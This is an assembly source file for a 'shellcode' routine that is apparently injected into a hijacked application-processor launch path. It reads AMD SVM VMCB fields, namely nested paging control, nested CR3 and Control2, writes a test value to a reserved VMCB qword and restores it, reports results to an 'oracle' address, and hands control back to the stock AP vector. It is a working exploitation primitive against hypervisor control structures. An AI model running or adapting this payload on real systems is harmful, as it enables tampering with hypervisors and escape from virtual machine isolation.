.intel_syntax noprefix
.text
.global shellcode
.type shellcode, @function

// Entered from the proven fixed-carrier AP launch. This probes only the
// reserved VMCB+0x100 qword and restores it before returning to stock AP code.
// The three placeholder immediates are patched by ap_fixed_probe_1270.c.
shellcode:
    lea     rsp, [rip + 0xef9]          // page + 0xf00
    push    rbx
    push    rsi
    push    rdi

    movabs  rbx, 0x1111111111111111   // VMCB direct-map VA
    movabs  rsi, 0x2222222222222222   // oracle VA
    movabs  rax, 0x1270a9e17e5e0001  // entered
    mov     qword ptr [rsi], rax

    mov     rax, qword ptr [rbx + 0x90]  // NESTED_CTRL
    mov     qword ptr [rsi + 8], rax
    cmp     rax, 9
    jne     bad

    mov     rax, qword ptr [rbx + 0xb0]  // NESTED_CR3
    mov     qword ptr [rsi + 16], rax
    test    rax, 0xfff
    jne     bad
    cmp     rax, 0x60000000
    jb      bad
    cmp     rax, 0x70000000
    jae     bad

    mov     rax, qword ptr [rbx + 0xb8]  // Control2
    cmp     rax, 1
    jne     bad

    mov     r8, qword ptr [rbx + 0x100]  // reserved qword
    mov     qword ptr [rsi + 24], r8
    test    r8, r8
    jne     bad

    movabs  r9, 0x1270127012701270
    mov     qword ptr [rbx + 0x100], r9
    mov     rax, qword ptr [rbx + 0x100]
    mov     qword ptr [rsi + 32], rax
    mov     qword ptr [rbx + 0x100], r8  // restore before comparison/exit
    mov     rdx, qword ptr [rbx + 0x100]
    mov     qword ptr [rsi + 40], rdx
    cmp     rax, r9
    jne     bad
    cmp     rdx, r8
    jne     bad

    movabs  rax, 0x1270a9e17e5e0002  // done
    mov     qword ptr [rsi], rax
    jmp     handoff

bad:
    movabs  rax, 0x1270a9e17e5e0003  // guard/readback failed
    mov     qword ptr [rsi], rax

handoff:
    pop     rdi
    pop     rsi
    pop     rbx
    movabs  rcx, 0x3333333333333333   // stock AP vector
    jmp     rcx
.size shellcode, .-shellcode
